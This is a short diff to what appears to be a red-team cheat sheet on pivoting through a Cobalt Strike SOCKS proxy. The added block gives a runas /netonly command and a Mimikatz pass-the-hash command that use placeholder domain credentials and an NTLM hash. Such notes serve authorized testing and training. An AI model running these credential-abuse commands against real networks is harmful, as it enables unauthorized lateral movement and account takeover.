@@ -310,6 +310,13 @@ proxychains <COMMAND>
 - For windows
 - Open Proxifier, go to Profile > Proxy Servers and Add a new proxy entry, which will point at the IP address and Port of your Cobalt Strike SOCKS proxy.
 - Next, go to Profile > Proxification Rules. This is where you can add rules that tell Proxifier when and where to proxy specific applications. Multiple applications can be added to the same rule, but in this example, I'm creating a single rule for adexplorer64.exe (part of the Sysinternals Suite).
+- Target hosts fill in the target internal network range with the action ```proxy socks <TARGET>```
+
+#### Proxychains netonly or overpass the hash
+```
+runas /netonly /user:<DOMAIN>\<USER> "C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
+sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:"C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
+```
 
 #### Metasploit
 - In Cobalt Strike, go to View > Proxy Pivots, highlight the existing SOCKS proxy and click the Tunnel button. 
